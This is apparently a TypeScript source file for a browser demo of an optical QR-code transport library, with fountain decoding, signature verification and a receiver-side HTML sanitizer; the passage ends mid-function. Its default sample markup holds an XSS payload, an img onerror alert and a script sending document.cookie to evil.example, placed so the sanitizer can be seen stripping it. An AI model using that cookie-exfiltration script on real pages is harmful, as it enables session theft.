import type { Playground } from '../registry';
import { defineOpticalSend, type OpticalSendElement } from '@johnhenry/oat-sender';
import {
  defineOpticalReceive,
  createInlineDecodeWorker,
  PacketStore,
  assembleArtifact,
  verifyReceivedArtifact,
  toHex,
  type OpticalReceiveElement,
  type PolicyDecision,
} from '@johnhenry/oat-receiver';
import {
  generateSigningKey,
  createCapabilityPolicy,
  extractPayload,
  type Ed25519KeyPair,
  type OatArtifact,
  type UiProposalEnvelope,
} from '@johnhenry/oat-protocol';
// Transitive dependency of oat-sender / oat-receiver: used only for visualisation
// (a mirror LT decoder so we can draw which source blocks are solved, and the
// seed -> degree/neighbour derivation that both ends share).
import {
  FountainDecoder,
  neighborsForSeed,
  robustSolitonTable,
  type OatPacket,
  type ImageDataLike,
} from '@johnhenry/oat-qr-fountain';
import { readState, writeState, copyLink } from '../state';
import './oat.css';

type Kind = 'text' | 'json' | 'file';
type UiMode = 'none' | 'safe-html' | 'sandboxed-html' | 'trusted-html';
type Trust = 'any' | 'sender' | 'tofu';

const DEFAULTS = {
  kind: 'json' as string,
  name: 'guest-wifi.json',
  text: JSON.stringify({ ssid: 'orrery-guest', security: 'WPA3', password: 'kepler-1619', expires: '2026-12-31' }, null, 2),
  ui: 'safe-html' as string,
  html: `<h3>Join the Orrery guest network?</h3>
<p>Network <b>orrery-guest</b> &middot; WPA3 &middot; valid until Dec 31.</p>
<form>
  <label>Device name <input name="device" value="my-phone"></label>
  <label><input type="checkbox" name="remember" checked> remember</label>
  <button data-optical-capability="ui.action.submit">Connect</button>
</form>
<img src="x" onerror="alert('pwned')">
<script>fetch('https://evil.example/?k=' + document.cookie)</script>`,
  fallback: 'Guest Wi-Fi credentials for orrery-guest.',
  sign: true,
  fps: 12,
  block: 120,
  ecc: 'M' as string,
  gzip: false,
  drop: 30,
  reorder: false,
  mode: 'loopback' as string,
  trust: 'any' as string,
  reqsig: true,
};
type State = typeof DEFAULTS;

const PRESETS: Record<string, Partial<State>> = {
  'Wi-Fi card': { kind: 'json', name: 'guest-wifi.json', text: DEFAULTS.text, ui: 'safe-html', html: DEFAULTS.html, fallback: DEFAULTS.fallback },
  'Haiku': {
    kind: 'text', name: 'haiku.txt', ui: 'none',
    text: 'light leaves one screen\nfalls through the air as squares\na lens catches it',
  },
  'Signed release': {
    kind: 'json', name: 'release-manifest.json', ui: 'sandboxed-html',
    text: JSON.stringify({ app: 'orrery', version: '2.4.0', sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', channel: 'stable' }, null, 2),
    html: '<h3>Install orrery 2.4.0?</h3><p>Runs a script to self-update.</p><script>installUpdate()</script>',
    fallback: 'Release manifest for orrery 2.4.0 (stable).',
  },
  'Big-ish text': {
    kind: 'text', name: 'lorem.txt', ui: 'none',
    text: Array.from({ length: 14 }, (_, i) => `Line ${i + 1}: fountain codes turn a file into an endless stream of interchangeable droplets.`).join('\n'),
  },
};

const RECEIVER_CAPS = createCapabilityPolicy(
  ['ui.render.text', 'ui.render.form.basic', 'ui.action.submit'],
  ['ui.open.external', 'ui.embed.iframe', 'ui.render.html.unsafe', 'html.script', 'html.network', 'html.storage', 'html.popup'],
);

/* ------------------------------------------------------------------ sanitizer */
const DROP_TAGS = new Set(['SCRIPT', 'STYLE', 'IFRAME', 'OBJECT', 'EMBED', 'LINK', 'META', 'BASE', 'IMG', 'VIDEO', 'AUDIO', 'SVG', 'MATH', 'TEMPLATE']);
const KEEP_TAGS = new Set(['H1', 'H2', 'H3', 'H4', 'P', 'B', 'I', 'STRONG', 'EM', 'CODE', 'PRE', 'UL', 'OL', 'LI', 'BR', 'SPAN', 'DIV', 'SMALL', 'FORM', 'LABEL', 'INPUT', 'SELECT', 'OPTION', 'TEXTAREA', 'BUTTON', 'TABLE', 'TR', 'TD', 'TH', 'TBODY', 'THEAD', 'HR']);
const KEEP_ATTRS = new Set(['name', 'value', 'placeholder', 'checked', 'selected', 'type', 'data-optical-capability', 'rows', 'cols', 'min', 'max', 'step']);
const INPUT_TYPES = new Set(['text', 'checkbox', 'number', 'radio', 'email', 'hidden']);

/** Receiver-side allowlist sanitizer: the sender's markup is data, never code. */
function sanitize(html: string): { frag: DocumentFragment; removed: string[] } {
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html');
  const removed: string[] = [];
  const walk = (el: Element) => {
    for (const child of [...el.children]) {
      if (DROP_TAGS.has(child.tagName)) { removed.push(`<${child.tagName.toLowerCase()}>`); child.remove(); continue; }
      if (!KEEP_TAGS.has(child.tagName)) { removed.push(`<${child.tagName.toLowerCase()}> (unwrapped)`); walk(child); child.replaceWith(...child.childNodes); continue; }
      for (const a of [...child.attributes]) {
        const bad = !KEEP_ATTRS.has(a.name) || (a.name === 'type' && child.tagName === 'INPUT' && !INPUT_TYPES.has(a.value));
        if (bad) { removed.push(`${a.name}= on <${child.tagName.toLowerCase()}>`); child.removeAttribute(a.name); }
      }
      if (child.tagName === 'BUTTON') child.setAttribute('type', 'button');
      walk(child);
    }
  };
  walk(doc.body);
  const frag = document.createDocumentFragment();
  for (const n of [...doc.body.childNodes]) frag.append(document.importNode(n, true));
  return { frag, removed };
}

function esc(s: string): string {
  return s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]!));
}
const short = (hex: string) => (hex.length > 20 ? `${hex.slice(0, 10)}…${hex.slice(-6)}` : hex);

const playground: Playground = {
  id: 'oat',
  title: 'Optical Transport',
  pkg: '@johnhenry/oat-sender',
  hue: 60,
  blurb: 'Fountain-coded QR frames carry a signed artifact from one screen to a camera. Air-gapped, zero setup.',
  docs: 'https://opensource.johnhenry.me/oat/',

  mount(host: HTMLElement) {
    const disposers: Array<() => void> = [];
    const on = <K extends string>(el: EventTarget, ev: K, fn: (e: Event) => void) => {
      el.addEventListener(ev, fn);
      disposers.push(() => el.removeEventListener(ev, fn));
    };

    try {
      defineOpticalSend();
      defineOpticalReceive();
    } catch (err) {
      host.innerHTML = `<pre class="code">${esc(String(err))}</pre>`;
      return;
    }

    const st: State = readState(DEFAULTS);
    let file: File | null = null;
    let keys: Ed25519KeyPair = generateSigningKey();

    const root = document.createElement('div');
    root.className = 'pg-oat';
    root.innerHTML = `
      <div class="panel oat-explain">
        <b>How it works.</b> The sender wraps your payload in a canonical-CBOR <b>artifact</b>
        (SHA-256 digest + Ed25519 signature + optional UI proposal), cuts it into <i>k</i> source blocks, and
        emits an <b>endless</b> stream of LT fountain <b>droplets</b>: each QR frame is the XOR of a random handful
        of blocks, chosen by a 32-bit seed. The receiver never needs any particular frame: any ~<i>k</i>+ε droplets
        let its peeling decoder solve every block, so dropped, duplicated and reordered frames just cost a little time.
        Then it verifies digest and signature and decides, under <i>its own</i> policy, whether the sender's proposed UI
        is accepted, downgraded or rejected. Nothing leaves this page: the right panel reads the left canvas pixels.
      </div>

      <div class="grid-2 oat-grid">
        <section class="panel oat-send">
          <header class="oat-h"><span class="chip">sender</span><b>&lt;optical-send&gt;</b><span class="sp"></span>
            <select class="oat-preset" aria-label="preset"><option value="">presets…</option>${Object.keys(PRESETS).map((p) => `<option>${esc(p)}</option>`).join('')}</select>
          </header>

          <div class="oat-row">
            <label class="field grow">name<input class="f-name" spellcheck="false"></label>
            <div class="seg f-kind" role="tablist">
              <button data-k="text">text</button><button data-k="json">json</button><button data-k="file">file</button>
            </div>
          </div>
          <textarea class="code f-text" spellcheck="false" rows="6"></textarea>
          <div class="f-filewrap" hidden>
            <input type="file" class="f-file">
            <div class="stat f-fileinfo">pick a small file (a few KB keeps the demo snappy)</div>
          </div>
          <div class="err f-jsonerr" hidden></div>

          <details class="oat-ui" open>
            <summary>proposed UI <span class="stat">ui-mode <b class="f-uimode-lbl"></b></span></summary>
            <div class="oat-row">
              <label class="field">ui-mode
                <select class="f-ui">
                  <option value="none">none (plain artifact)</option>
                  <option value="safe-html">safe-html</option>
                  <option value="sandboxed-html">sandboxed-html</option>
                  <option value="trusted-html">trusted-html</option>
                </select>
              </label>
              <label class="field grow">fallback text<input class="f-fallback"></label>
            </div>
            <textarea class="code f-html" spellcheck="false" rows="6"></textarea>
          </details>

          <div class="oat-row keys">
            <label class="chk"><input type="checkbox" class="f-sign"> sign (Ed25519)</label>
            <span class="stat">pubkey <b class="f-pub"></b></span>
            <span class="sp"></span>
            <button class="btn f-rekey">new keypair</button>
          </div>

          <div class="stage">
            <optical-send class="sender" autostart></optical-send>
            <div class="stage-meta">
              <div class="big"><span class="stat">frame</span><b class="s-frame">0</b></div>
              <div class="stat">state <b class="s-state">idle</b></div>
              <div class="stat">source blocks k <b class="s-k">–</b></div>
              <div class="stat">envelope <b class="s-bytes">–</b> B</div>
              <div class="stat">frames / sweep <b class="s-sweep">–</b></div>
              <div class="stat">sweeps sent <b class="s-sweeps">0</b></div>
              <button class="btn primary s-toggle">pause</button>
            </div>
          </div>

          <div class="oat-controls">
            <label class="field"><span>fps <b class="v-fps"></b></span><input type="range" class="f-fps" min="2" max="30" step="1"></label>
            <label class="field"><span>block size <b class="v-block"></b> B</span><input type="range" class="f-block" min="40" max="400" step="10"></label>
            <label class="field">QR redundancy (ECC)
              <select class="f-ecc"><option value="L">L ~7%</option><option value="M">M ~15%</option><option value="Q">Q ~25%</option><option value="H">H ~30%</option></select>
            </label>
            <label class="chk"><input type="checkbox" class="f-gzip"> gzip</label>
          </div>
          <div class="err s-err" hidden></div>
        </section>

        <section class="panel oat-recv">
          <header class="oat-h"><span class="chip">receiver</span><b>&lt;optical-receive&gt;</b><span class="sp"></span>
            <div class="seg r-mode"><button data-m="loopback">loopback</button><button data-m="camera">camera</button></div>
          </header>

          <div class="r-loop">
            <label class="field"><span>drop <b class="v-drop"></b>% of frames</span><input type="range" class="f-drop" min="0" max="90" step="5"></label>
            <label class="chk"><input type="checkbox" class="f-reorder"> shuffle / reorder frames</label>
          </div>
          <div class="r-cam" hidden>
            <p class="stat">Open this planet on a phone (same URL) and point it at another screen showing the sender, or use a webcam here.
              The camera stream feeds the element's own scan loop.</p>
            <button class="btn primary r-camstart">enable camera</button>
            <div class="err r-camerr" hidden></div>
          </div>
          <optical-receive class="receiver" scan-rate="12">
            <span slot="empty"></span><span slot="scanning"></span><span slot="verifying"></span>
            <span slot="complete"></span><span slot="rejected"></span><span slot="error"></span>
          </optical-receive>

          <div class="r-bar"><div class="r-fill"></div><span class="r-pct">0%</span></div>
          <div class="r-stats">
            <span class="stat">offered <b class="r-offered">0</b></span>
            <span class="stat">dropped <b class="r-dropped">0</b></span>
            <span class="stat">symbols <b class="r-syms">0</b></span>
            <span class="stat">dupes <b class="r-dupes">0</b></span>
            <span class="stat">unreadable <b class="r-bad">0</b></span>
            <span class="stat">overhead <b class="r-over">–</b></span>
            <span class="stat">state <b class="r-state">idle</b></span>
          </div>

          <div class="viz">
            <div>
              <div class="viz-t">source blocks (solved by peeling)</div>
              <div class="blocks"></div>
              <div class="viz-t">frame tape <span class="legend"><i class="lg solve"></i>solved <i class="lg buf"></i>buffered <i class="lg dup"></i>redundant <i class="lg drop"></i>dropped</span></div>
              <canvas class="tape" width="600" height="28"></canvas>
              <div class="pkt stat">last droplet: <b class="pkt-d">–</b></div>
            </div>
            <div>
              <div class="viz-t">degree distribution <span class="stat">(bars: seen, line: robust soliton)</span></div>
              <canvas class="deg" width="600" height="110"></canvas>
            </div>
          </div>

          <div class="verdict">
            <div class="checks"></div>
            <div class="r-policy">
              <label class="field">trust
                <select class="f-trust">
                  <option value="any">any valid signature</option>
                  <option value="sender">pinned: this sender's key</option>
                  <option value="tofu">explicit trust (TOFU prompt)</option>
                </select>
              </label>
              <label class="chk"><input type="checkbox" class="f-reqsig"> require signature</label>
              <button class="btn r-tamper" title="flip one payload byte of the received artifact and re-verify">tamper test</button>
              <button class="btn r-reset">receive again</button>
            </div>
            <div class="decision"></div>
            <div class="payload"></div>
          </div>
        </section>
      </div>
      <div class="oat-foot"><button class="btn f-link">copy link</button><span class="stat f-linkmsg"></span>
        <span class="stat">the link carries the artifact text, UI proposal and every sender/receiver setting</span></div>
    `;
    host.appendChild(root);

    const $ = <T extends Element = HTMLElement>(s: string) => root.querySelector(s) as T;
    const sender = $<OpticalSendElement>('optical-send');
    const receiver = $<OpticalReceiveElement>('optical-receive');
    receiver.capabilityPolicy = RECEIVER_CAPS;

    const fName = $<HTMLInputElement>('.f-name');
    const fText = $<HTMLTextAreaElement>('.f-text');
    const fHtml = $<HTMLTextAreaElement>('.f-html');
    const fUi = $<HTMLSelectElement>('.f-ui');
    const fFallback = $<HTMLInputElement>('.f-fallback');
    const fSign = $<HTMLInputElement>('.f-sign');
    const fFps = $<HTMLInputElement>('.f-fps');
    const fBlock = $<HTMLInputElement>('.f-block');
    const fEcc = $<HTMLSelectElement>('.f-ecc');
    const fGzip = $<HTMLInputElement>('.f-gzip');
    const fDrop = $<HTMLInputElement>('.f-drop');
    const fReorder = $<HTMLInputElement>('.f-reorder');
    const fTrust = $<HTMLSelectElement>('.f-trust');
    const fReqsig = $<HTMLInputElement>('.f-reqsig');

    const save = () => writeState(st as unknown as Record<string, unknown>, DEFAULTS as unknown as Record<string, unknown>);

    /* --------------------------------------------------------------- UI sync */
    function syncForm() {
      fName.value = st.name;
      fText.value = st.text;
      fHtml.value = st.html;
      fUi.value = st.ui;
      fFallback.value = st.fallback;
      fSign.checked = st.sign;
      fFps.value = String(st.fps);
      fBlock.value = String(st.block);
      fEcc.value = st.ecc;
      fGzip.checked = st.gzip;
      fDrop.value = String(st.drop);
      fReorder.checked = st.reorder;
      fTrust.value = st.trust;
      fReqsig.checked = st.reqsig;
      $('.v-fps').textContent = String(st.fps);
      $('.v-block').textContent = String(st.block);
      $('.v-drop').textContent = String(st.drop);
      $('.f-uimode-lbl').textContent = st.ui;
      fHtml.disabled = st.ui === 'none';
      fFallback.disabled = st.ui === 'none';
      root.querySelectorAll<HTMLButtonElement>('.f-kind button').forEach((b) => b.classList.toggle('on', b.dataset.k === st.kind));
      root.querySelectorAll<HTMLButtonElement>('.r-mode button').forEach((b) => b.classList.toggle('on', b.dataset.m === st.mode));
      fText.hidden = st.kind === 'file';
      $('.f-filewrap').hidden = st.kind !== 'file';
      $('.r-loop').hidden = st.mode !== 'loopback';
      $('.r-cam').hidden = st.mode !== 'camera';
      receiver.classList.toggle('cam', st.mode === 'camera');
      $('.f-pub').textContent = st.sign ? short(toHex(keys.publicKey)) : 'unsigned';
    }

    function applyReceiverPolicy() {
      if (st.reqsig) receiver.setAttribute('require-signature', '');
      else receiver.removeAttribute('require-signature');
      receiver.requireExplicitTrust = st.trust === 'tofu';
      receiver.trustedPublicKeys = st.trust === 'sender' ? [toHex(keys.publicKey)] : [];
    }

    /* ------------------------------------------------------------ sender side */
    let prepTimer: number | undefined;
    let k = 0;
    let framesPerSweep = 1;
    function schedulePrepare(delay = 250) {
      clearTimeout(prepTimer);
      prepTimer = window.setTimeout(() => { void prepare(); }, delay);
    }

    async function prepare() {
      const err = $('.f-jsonerr');
      err.hidden = true;
      let source: Blob | string;
      let type: string;
      if (st.kind === 'file') {
        if (!file) { source = new Blob(['(no file chosen yet — pick one above)'], { type: 'text/plain' }); type = 'text/plain'; }
        else { source = file; type = file.type || 'application/octet-stream'; }
      } else if (st.kind === 'json') {
        try { JSON.parse(st.text); } catch (e) { err.textContent = `JSON: ${(e as Error).message} (sending anyway as text)`; err.hidden = false; }
        source = new Blob([st.text], { type: 'application/json' });
        type = 'application/json';
      } else {
        source = new Blob([st.text], { type: 'text/plain;charset=utf-8' });
        type = 'text/plain;charset=utf-8';
      }
      // UI proposal is authored as light-DOM <template slot=...> children.
      sender.querySelectorAll('template').forEach((t) => t.remove());
      if (st.ui !== 'none') {
        const tp = document.createElement('template');
        tp.setAttribute('slot', 'proposal');
        tp.innerHTML = st.html;
        const tf = document.createElement('template');
        tf.setAttribute('slot', 'fallback');
        tf.innerHTML = esc(st.fallback);
        sender.append(tp, tf);
        sender.setAttribute('ui-mode', st.ui);
      } else sender.removeAttribute('ui-mode');
      sender.setAttribute('type', type);
      sender.setAttribute('title', st.name || 'artifact');
      sender.setAttribute('summary', st.fallback);
      sender.setAttribute('origin-id', 'orrery:oat-room');
      sender.setAttribute('block-size', String(st.block));
      sender.setAttribute('ecc', st.ecc);
      sender.setAttribute('frame-rate', String(st.fps));
      sender.setAttribute('compression', st.gzip ? 'gzip' : 'none');
      sender.signingKey = st.sign ? { secretKey: keys.secretKey, keyId: 'orrery-demo' } : null;
      sender.metadata = { name: st.name, kind: st.kind };
      sender.source = source; // setter triggers prepare()
    }

    on(sender, 'oat-manifest-ready', () => {
      resetReceiver();
    });
    on(sender, 'oat-state-change', (e) => {
      const d = (e as CustomEvent).detail as { state: string; blockCount?: number; byteLength?: number; error?: string };
      $('.s-state').textContent = d.state;
      if (d.blockCount) {
        k = d.blockCount;
        framesPerSweep = Math.max(1, Math.ceil(k * 1.3));
        $('.s-k').textContent = String(k);
        $('.s-bytes').textContent = String(d.byteLength);
        $('.s-sweep').textContent = String(framesPerSweep);
        buildBlocks();
      }
      const errEl = $('.s-err');
      errEl.hidden = !d.error;
      if (d.error) errEl.textContent = d.error;
      $('.s-toggle').textContent = d.state === 'transmitting' ? 'pause' : 'transmit';
    });
    on(sender, 'oat-error', (e) => {
      const d = (e as CustomEvent).detail as { error: Error };
      const errEl = $('.s-err');
      errEl.hidden = false;
      errEl.textContent = String(d.error?.message ?? d.error);
    });
    on(sender, 'oat-progress', (e) => {
      const n = (e as CustomEvent).detail.framesSent as number;
      $('.s-frame').textContent = String(n);
      $('.s-sweeps').textContent = (n / framesPerSweep).toFixed(1);
      if (st.mode === 'loopback') queueMicrotask(captureFrame);
    });

    /* ---------------------------------------------------------- receiver side */
    const worker = createInlineDecodeWorker();
    let store = new PacketStore();
    let mirror: FountainDecoder | null = null;
    let mirrorId = '';
    let offered = 0, dropped = 0;
    let degreeSeen: number[] = [];
    let tape: Array<'solve' | 'buf' | 'dup' | 'drop' | 'bad'> = [];
    let reorderBuf: ImageData[] = [];
    let doneAt = 0;
    let lastDecision: PolicyDecision | null = null;
    let payloadUrl = '';

    const scratch = document.createElement('canvas');
    const sctx = scratch.getContext('2d', { willReadFrequently: true })!;

    function resetReceiver() {
      receiver.reset();
      store = new PacketStore();
      mirror = null; mirrorId = '';
      offered = 0; dropped = 0; doneAt = 0;
      degreeSeen = []; tape = []; reorderBuf = [];
      lastDecision = null;
      $('.checks').innerHTML = '';
      $('.decision').innerHTML = '';
      $('.payload').innerHTML = '';
      if (payloadUrl) { URL.revokeObjectURL(payloadUrl); payloadUrl = ''; }
      buildBlocks();
      renderStats();
    }

    function captureFrame() {
      const c = sender.shadowRoot?.querySelector('canvas');
      if (!c || !c.width) return;
      if (doneAt || !['idle', 'receiving', 'camera-ready'].includes(receiver.state)) return; // transfer finished
      offered++;
      if (Math.random() * 100 < st.drop) { dropped++; pushTape('drop'); renderStats(); return; }
      scratch.width = c.width; scratch.height = c.height;
      sctx.drawImage(c, 0, 0);
      let img = sctx.getImageData(0, 0, c.width, c.height);
      if (st.reorder) {
        reorderBuf.push(img);
        if (reorderBuf.length < 4) { renderStats(); return; }
        img = reorderBuf.splice(Math.floor(Math.random() * reorderBuf.length), 1)[0];
      }
      ingest(img);
    }

    /** One captured frame → decode → mirror bookkeeping → the real element pipeline. */
    function ingest(img: ImageDataLike) {
      if (receiver.state !== 'idle' && receiver.state !== 'receiving' && receiver.state !== 'camera-ready') { renderStats(); return; }
      const packet: OatPacket | null = worker.decodeFrame(img);
      store.ingestFrame(packet);
      if (!packet) pushTape('bad');
      else {
        const id = toHex(packet.artifactId);
        if (id !== mirrorId) { mirrorId = id; mirror = new FountainDecoder(packet.sourceBlockCount, packet.blockSize, packet.totalLength); k = packet.sourceBlockCount; degreeSeen = []; buildBlocks(); }
        const nbrs = [...neighborsForSeed(packet.seed, packet.sourceBlockCount)];
        const beforeSeen = mirror!.packetsSeen;
        const beforeProg = mirror!.progress;
        mirror!.addPacket(packet);
        if (mirror!.packetsSeen === beforeSeen) pushTape('dup');
        else {
          degreeSeen[nbrs.length] = (degreeSeen[nbrs.length] ?? 0) + 1;
          pushTape(mirror!.progress > beforeProg ? 'solve' : 'buf');
        }
        $('.pkt-d').textContent = `seed ${packet.seed.toString(16).padStart(8, '0')} · degree ${nbrs.length} · XOR of blocks {${nbrs.join(', ')}}`;
      }
      // Real pipeline: the <optical-receive> element decodes, fountain-stores, assembles, verifies, decides.
      receiver.processFrame(img);
      if (receiver.progress >= 1 && !doneAt) doneAt = store.framesSeen;
      renderStats();
    }

    function pushTape(t: (typeof tape)[number]) {
      tape.push(t);
      if (tape.length > 120) tape.shift();
    }

    function buildBlocks() {
      const el = $('.blocks');
      const n = mirror ? k : k || 0;
      if (el.childElementCount !== n) el.innerHTML = Array.from({ length: n }, (_, i) => `<i title="block ${i}"></i>`).join('');
    }

    function renderStats() {
      const prog = st.mode === 'camera' ? receiver.progress : Math.max(receiver.progress, mirror?.progress ?? 0);
      $<HTMLElement>('.r-fill').style.width = `${(prog * 100).toFixed(1)}%`;
      $('.r-pct').textContent = `${(prog * 100).toFixed(0)}% decoded`;
      $('.r-offered').textContent = String(st.mode === 'camera' ? receiver.framesSeen : offered);
      $('.r-dropped').textContent = String(dropped);
      $('.r-syms').textContent = String(mirror?.packetsSeen ?? 0);
      $('.r-dupes').textContent = String(store.duplicateFrames);
      $('.r-bad').textContent = String(store.invalidFrames);
      const syms = mirror?.packetsSeen ?? 0;
      $('.r-over').textContent = k && syms ? `${(syms / k).toFixed(2)}× k` : '–';
      $('.r-state').textContent = receiver.state;
      // block grid
      const solved = (mirror as unknown as { solved?: Array<Uint8Array | undefined> } | null)?.solved;
      root.querySelectorAll<HTMLElement>('.blocks i').forEach((b, i) => b.classList.toggle('on', Boolean(solved?.[i])));
      drawTape();
      drawDegrees();
    }

    const tapeCanvas = $<HTMLCanvasElement>('canvas.tape');
    const degCanvas = $<HTMLCanvasElement>('canvas.deg');
    const css = (v: string) => getComputedStyle(root).getPropertyValue(v).trim() || '#888';
    function drawTape() {
      const ctx = tapeCanvas.getContext('2d')!;
      const W = tapeCanvas.width, H = tapeCanvas.height;
      ctx.clearRect(0, 0, W, H);
      const w = W / 120;
      const col = { solve: css('--accent'), buf: css('--oat-buf'), dup: css('--ink-3'), drop: css('--error'), bad: css('--warning') };
      tape.forEach((t, i) => {
        ctx.fillStyle = col[t];
        const h = t === 'drop' ? H * 0.35 : t === 'solve' ? H : H * 0.7;
        ctx.fillRect(i * w + 0.5, H - h, Math.max(1, w - 1.5), h);
      });
    }
    function drawDegrees() {
      const ctx = degCanvas.getContext('2d')!;
      const W = degCanvas.width, H = degCanvas.height;
      ctx.clearRect(0, 0, W, H);
      if (!k) return;
      const maxD = Math.min(k, 12);
      const bins: number[] = [];
      for (let d = 1; d <= maxD; d++) bins.push(d < maxD ? degreeSeen[d] ?? 0 : degreeSeen.slice(maxD).reduce((a, b) => a + (b ?? 0), 0));
      const total = bins.reduce((a, b) => a + b, 0) || 1;
      const cum = robustSolitonTable(k);
      const theo: number[] = [];
      for (let d = 1; d <= maxD; d++) theo.push(d < maxD ? cum[d] - cum[d - 1] : 1 - cum[maxD - 1]);
      const peak = Math.max(...bins.map((b) => b / total), ...theo, 0.01);
      const bw = (W - 10) / maxD;
      const bottom = H - 14;
      ctx.font = '10px ui-monospace, monospace';
      ctx.textAlign = 'center';
      for (let i = 0; i < maxD; i++) {
        const h = (bins[i] / total / peak) * (bottom - 6);
        ctx.fillStyle = css('--accent');
        ctx.globalAlpha = 0.75;
        ctx.fillRect(5 + i * bw + 2, bottom - h, bw - 4, h);
        ctx.globalAlpha = 1;
        ctx.fillStyle = css('--ink-3');
        ctx.fillText(i + 1 === maxD && maxD < k ? `${maxD}+` : String(i + 1), 5 + i * bw + bw / 2, H - 2);
      }
      ctx.strokeStyle = css('--ink');
      ctx.lineWidth = 1.5;
      ctx.beginPath();
      theo.forEach((p, i) => {
        const x = 5 + i * bw + bw / 2, y = bottom - (p / peak) * (bottom - 6);
        if (i) ctx.lineTo(x, y); else ctx.moveTo(x, y);
      });
      ctx.stroke();
    }

    /* ---------------------------------------------------- verdict & safe UI */
    function checkRow(label: string, ok: boolean | 'absent' | null, note = '') {
      const cls = ok === true ? 'ok' : ok === 'absent' || ok === null ? 'na' : 'bad';
      const mark = ok === true ? '✓' : ok === 'absent' ? '–' : ok === null ? '…' : '✗';
      return `<div class="ck ${cls}"><span>${mark}</span>${esc(label)}${note ? ` <small>${esc(note)}</small>` : ''}</div>`;
    }

    function renderVerdict() {
      const art = receiver.artifact;
      const v = receiver.verification;
      const checks = $('.checks');
      if (!art || !v) { checks.innerHTML = ''; return; }
      const pubHex = art.signature ? toHex(art.signature.publicKey) : '';
      const frames = doneAt || store.framesSeen;
      checks.innerHTML = `
        <div class="ck-head">received <b>${esc(String((art.metadata?.name as string) ?? art.id))}</b> in ${frames} frames
          <span class="stat">(${offered} offered, ${dropped} dropped · k=${k})</span></div>
        ${checkRow('digest ok (SHA-256)', v.digestValid)}
        ${checkRow('signature ok (Ed25519)', v.signatureValid, art.signature ? `key ${short(pubHex)}${pubHex === toHex(keys.publicKey) ? ' = sender' : ''}` : 'unsigned')}
        ${checkRow('sender trusted', v.senderTrusted, st.trust)}
        ${checkRow('media type accepted', v.mediaTypeAccepted, art.mediaType)}
        ${checkRow('not expired', !v.expired)}
        ${v.reasons.length ? `<div class="reasons">reasons: ${v.reasons.map((r) => `<span class="chip bad">${esc(r)}</span>`).join(' ')}</div>` : ''}
        ${receiver.state === 'unknown-sender' ? `<div class="tofu">Valid signature from an <b>unknown</b> key ${esc(short(pubHex))}. <button class="btn primary r-trustgo">trust sender &amp; continue</button> <button class="btn r-trustno">reject</button></div>` : ''}
      `;
    }

    function renderDecision(proposal: UiProposalEnvelope | undefined, decision: PolicyDecision | null) {
      const box = $('.decision');
      box.innerHTML = '';
      if (!proposal) {
        if (receiver.state === 'accepted') box.innerHTML = `<div class="dec accept"><b>accepted</b> · plain artifact, no UI proposed</div>`;
        return;
      }
      if (!decision) { box.innerHTML = `<div class="dec reject"><b>rejected</b> · proposal not evaluated (artifact failed verification)</div>`; return; }
      lastDecision = decision;
      const outcome = decision.outcome;
      const cls = outcome.startsWith('accept') ? 'accept' : outcome === 'downgrade' ? 'down' : 'reject';
      const requested = proposal.requestedCapabilities.map((c) => c.capability);
      const head = document.createElement('div');
      head.className = `dec ${cls}`;
      head.innerHTML = `<b>${esc(outcome)}</b> · requested <span class="chip">${esc(proposal.requestedProfile)}</span>
        ${decision.reasons.map((r) => `<span class="chip bad">${esc(r)}</span>`).join(' ')}
        <div class="caps">${requested.length ? requested.map((c) => {
          const g = decision.effectiveCapabilities.includes(c);
          return `<span class="cap ${g ? 'g' : ''}">${g ? '✓' : '○'} ${esc(c)}${!g && outcome === 'accept-safe' ? ` <button class="btn mini r-grant" data-cap="${esc(c)}">grant</button>` : ''}</span>`;
        }).join(' ') : '<span class="stat">no capabilities requested</span>'}</div>`;
      box.appendChild(head);

      const view = document.createElement('div');
      view.className = 'safeview';
      if (outcome === 'accept-safe' && proposal.preferredView.kind === 'safe-html') {
        const { frag, removed } = sanitize(proposal.preferredView.html);
        frag.querySelectorAll<HTMLElement>('[data-optical-capability]').forEach((el) => {
          const cap = el.getAttribute('data-optical-capability')!;
          if (!decision.effectiveCapabilities.includes(cap)) { el.setAttribute('disabled', ''); el.title = `needs ${cap}`; }
        });
        view.innerHTML = `<div class="sv-t">${esc(proposal.title)} <span class="stat">receiver-sanitized · origin ${esc(proposal.origin.id)}</span></div>`;
        const body = document.createElement('div');
        body.className = 'sv-body';
        body.append(frag);
        view.append(body);
        if (removed.length) {
          const r = document.createElement('div');
          r.className = 'removed';
          r.innerHTML = `sanitizer stripped: ${removed.map((x) => `<span class="chip bad">${esc(x)}</span>`).join(' ')}`;
          view.append(r);
        }
        body.querySelectorAll('button').forEach((b) => b.addEventListener('click', () => {
          const form = b.closest('form');
          const data = form ? Object.fromEntries(new FormData(form).entries()) : {};
          const out = document.createElement('pre');
          out.className = 'code';
          out.textContent = `UiActionRequest ${JSON.stringify({ proposalId: proposal.proposalId, action: 'submit', capability: b.getAttribute('data-optical-capability'), data }, null, 2)}\n(held locally; the receiver mediates every action)`;
          view.querySelector('pre')?.remove();
          view.append(out);
        }));
        body.querySelectorAll('form').forEach((f) => f.addEventListener('submit', (e) => e.preventDefault()));
      } else {
        const fb = proposal.fallbackView;
        const text = fb.kind === 'text' ? fb.body : proposal.summary ?? proposal.title;
        const tmp = document.createElement('div');
        tmp.innerHTML = text; // decode entities only; rendered below as text
        view.innerHTML = `<div class="sv-t">fallback view <span class="stat">(text only${outcome === 'reject' ? '' : ', proposal downgraded'})</span></div>`;
        const p = document.createElement('p');
        p.textContent = tmp.textContent ?? '';
        view.append(p);
      }
      box.appendChild(view);
    }

    async function renderPayload(art: OatArtifact) {
      const box = $('.payload');
      try {
        const bytes = await extractPayload(art);
        if (receiver.artifact !== art) return;
        if (payloadUrl) URL.revokeObjectURL(payloadUrl);
        payloadUrl = URL.createObjectURL(new Blob([bytes as BlobPart], { type: art.mediaType }));
        const name = String(art.metadata?.name ?? 'artifact');
        let preview = '';
        if (art.mediaType.startsWith('image/')) preview = `<img class="pv-img" src="${payloadUrl}" alt="">`;
        else if (/^text\/|json|xml|javascript/.test(art.mediaType)) {
          let t = new TextDecoder().decode(bytes);
          if (art.mediaType.includes('json')) { try { t = JSON.stringify(JSON.parse(t), null, 2); } catch {} }
          preview = `<pre class="code">${esc(t.length > 4000 ? t.slice(0, 4000) + '\n…' : t)}</pre>`;
